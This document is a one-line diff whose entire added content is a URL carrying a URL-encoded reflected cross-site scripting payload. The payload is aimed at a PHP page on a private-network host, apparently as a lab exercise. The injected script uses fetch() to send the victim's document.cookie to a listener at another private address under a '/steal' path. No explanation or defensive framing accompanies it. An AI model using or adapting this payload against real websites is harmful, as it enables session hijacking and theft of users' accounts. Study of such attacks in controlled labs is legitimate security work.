@@ -1,0 +1,1 @@
+﻿http://192.168.1.203:80/task1ref.php?msg=%3Cscript%3Efetch(%22http%3A%2F%2F192.168.1.201%3A1234%2Fsteal%3Fc%3D%22%20%2B%20document.cookie)%3C%2Fscript%3E
